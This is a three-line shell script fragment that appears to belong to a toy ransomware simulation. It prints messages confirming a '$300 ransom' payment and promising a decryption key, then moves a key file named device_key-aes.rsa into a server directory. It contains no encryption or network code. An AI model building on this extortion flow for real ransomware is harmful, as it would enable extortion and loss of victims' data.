echo "YOU'VE PAID YOUR \$300 RANSOM"
echo "YOUR KEY WILL BE SENT TO YOU"
mv device_key-aes.rsa ../server/

